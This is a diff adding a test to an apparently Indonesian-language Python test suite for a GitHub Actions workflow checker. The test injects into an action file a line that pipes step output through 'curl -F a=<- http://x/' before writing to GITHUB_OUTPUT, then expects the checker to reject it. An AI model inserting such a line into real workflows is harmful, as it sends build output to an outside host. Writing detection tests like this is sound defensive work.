@@ -42350,6 +42350,27 @@ def main():
                         [sys.executable, GERBANG, "--hanya-workflow"])
         periksa("konflik metode per seksi: data di seksi 1 tak membunuh unggahan stdin seksi 2 (Audit 2962)", rc != 0)
         shutil.rmtree(sub1999, ignore_errors=True)
+        sub2000 = klon(tmp, "sub2000")
+        berkas_aksi2000 = os.path.join(
+            sub2000, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi2000, encoding="utf-8") as f:
+            isi_aksi2000 = f.read()
+        baris_aksi2000 = [b for b in isi_aksi2000.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru2000 = isi_aksi2000.replace(
+                baris_aksi2000,
+                baris_aksi2000.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(curl -F a=<- http://x/; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru2000 != isi_aksi2000, \
+            "suntikan aksi2000 tidak menembak"
+        with open(berkas_aksi2000, "w", encoding="utf-8") as f:
+            f.write(isi_baru2000)
+        rc, out = jalan(sub2000,
+                        [sys.executable, GERBANG, "--hanya-workflow"])
+        periksa("form isi-dari-stdin <- adalah sumber saat-urai (Audit 2964)", rc != 0)
+        shutil.rmtree(sub2000, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
